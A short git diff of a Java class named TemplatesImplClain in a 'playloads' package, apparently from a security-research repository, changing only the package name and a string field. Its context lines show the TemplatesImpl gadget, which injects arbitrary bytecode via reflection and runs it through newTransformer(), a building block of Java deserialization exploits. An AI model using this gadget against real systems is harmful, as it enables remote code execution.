@@ -1,4 +1,4 @@
-package cn.hungslabsec.playloads;
+package playloads;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
@@ -12,7 +12,7 @@ public class TemplatesImplClain  {
         TemplatesImpl templates = new TemplatesImpl();
 
         setFieldValue(templates, "_class", null);
-        setFieldValue(templates, "_name", "donk");
+        setFieldValue(templates, "_name", "Hungs");
         setFieldValue(templates, "_bytecodes", new byte[][]{bytecode});
         setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
         templates.newTransformer();
